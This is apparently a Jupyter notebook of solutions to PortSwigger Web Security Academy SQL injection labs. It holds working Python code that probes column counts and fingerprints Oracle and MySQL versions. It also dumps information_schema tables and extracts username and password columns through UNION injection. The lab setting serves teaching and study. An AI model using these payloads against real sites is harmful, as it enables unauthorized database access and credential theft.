{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "78a1c138",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/examining-the-database"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55d87940",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 1 : Oracle\n",
    "\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "fb11dded",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac1e1f461e951c0c80ae807400e0008c.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add \"FROM DUAL\" because this is an oracle database\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "134420da",
   "metadata": {
    "hidden": true
   },
   "source": [
    "From the responses we can see that we have two columns returned. \n",
    "\n",
    "Next we want to work out which field will accept string data types:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "4e946226",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "results = []\n",
    "\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"]*n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    query = \"filter?category='+UNION+SELECT+{}+FROM+DUAL--\".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "78a6045f",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Either of the two columns seem to be compatible with text. \n",
    "\n",
    "Ok so now that we've done the reconnaissance let's actually run our union attack to get the database information.\n",
    "\n",
    "One quick thing to note here is that Oracle returns the database information in a single column with the heading \"BANNER\". Since the original database has two columns we need to add a column to our query so the UNION works."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "1b75db66",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "#Final payload\n",
    "query = \"filter?category='+UNION+SELECT+BANNER,'a'+FROM+V$VERSION--\"\n",
    "r = requests.get(URL + query)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44a43d06",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Success!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4aa622d",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Question 2 : MySQL\n",
    "\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "3d257357",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [500]>, <Response [200]>, <Response [500]>, <Response [500]>]\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "URL = \"https://ac131f981fa34dc980990ee8009800aa.web-security-academy.net/\"\n",
    "\n",
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "for x in range(1, 5):\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{}-- \".format((\"NULL,\" * x)[:-1])\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3eac3eb",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As in the oracle case we have two columns.\n",
    "\n",
    "Now lets check which are text compatible:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "d173039d",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[<Response [200]>, <Response [200]>]\n"
     ]
    }
   ],
   "source": [
    "#Work out how many columns the returned query has\n",
    "results = []\n",
    "n_columns = 2\n",
    "for x in range(n_columns):\n",
    "    NULLs = [\"NULL\"] * n_columns\n",
    "    NULLs[x] = \"\\'a\\'\"\n",
    "    #NB we need to add a space after the comment for MySQL\n",
    "    query = \"filter?category=' UNION SELECT+{} -- \".format(\",\".join(NULLs))\n",
    "    r = requests.get(URL + query)\n",
    "    results.append(r)\n",
    "print(results)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "db764461",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Once again both columns are string compatible. Cool. Ok now for the payload."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "572b438f",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "#Final payload\n",
    "query = \"filter?category=' UNION SELECT NULL,@@version -- \"\n",
    "r = requests.get(URL + query)\n",
    "print(r)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d748eaf",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Yay it worked! Now we just need to paste it into the PortSwigger lab."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "3d2d8074",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"filter?category='+UNION+SELECT+NULL,@@version+--+\""
      ]
     },
     "execution_count": 84,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query.replace(\" \", \"+\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5f3988ed",
   "metadata": {},
   "source": [
    "# Question 3: Getting Database Info (Non-oracle)\n",
    "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c114aa98",
   "metadata": {},
   "source": [
    "We can assument that we know the original query returns two columns, and that both of them are string compatible.\n",
    "\n",
    "To grab the database information, we'll UNION inject. To make the dimensions of the union injection match the original query we will concatenate the columns."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "7c553e81",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "i_s = \"information_schema\"\n",
    "URL = \"https://ac4a1f791e6257cf804939c500b400ca.web-security-academy.net/\"\n",
    "query = f\"filter?category=' UNION SELECT CONCAT(TABLE_NAME, '~', TABLE_TYPE),NULL FROM {i_s}.tables -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "96b0ab0c",
   "metadata": {},
   "source": [
    "Ok this appears to work. There are a lot of tables returned. Let's print them out:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "bfaf3969",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['sql_parts',\n",
       " 'products',\n",
       " 'sql_languages',\n",
       " 'sql_sizing',\n",
       " 'users_yxfmuy',\n",
       " 'sql_implementation_info',\n",
       " 'sql_sizing_profiles',\n",
       " 'sql_packages',\n",
       " 'sql_features']"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "tables = [x.split(\"~\") for x in re.findall(r\"<th>(.*)</th>\", r.text)]\n",
    "\n",
    "#print only BASE TABLEs and tables without \"pg_\"\n",
    "base_tables = [x[0] for x in tables if (x[1]==\"BASE TABLE\" and not \"pg_\" in x[0])]\n",
    "base_tables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "6f4f8011",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "table_name = \"users_yxfmuy\"\n",
    "\n",
    "query = f\"filter?category=\\' UNION SELECT CONCAT(COLUMN_NAME, \\'~\\', DATA_TYPE),NULL \" + \\\n",
    "f\"FROM {i_s}.columns WHERE TABLE_NAME = \\'{table_name}\\' -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "4a545352",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['password_cctbkm', 'character varying'],\n",
       " ['username_prihbh', 'character varying']]"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "tables = [x.split(\"~\") for x in re.findall(r\"<th>(.*)</th>\", r.text)]\n",
    "\n",
    "tables"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3671f9b2",
   "metadata": {},
   "source": [
    "OK that looks pretty promising!\n",
    "\n",
    "Lets grab those!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "091debc2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "query = f\"filter?category=\\' UNION SELECT CONCAT(username_prihbh, \\'~\\', password_cctbkm),NULL \" + \\\n",
    "f\"FROM {table_name} -- \"\n",
    "\n",
    "r = requests.get(URL + query)\n",
    "r"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "597019ac",
   "metadata": {},
   "outputs": [],
   "source": [
    "r"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
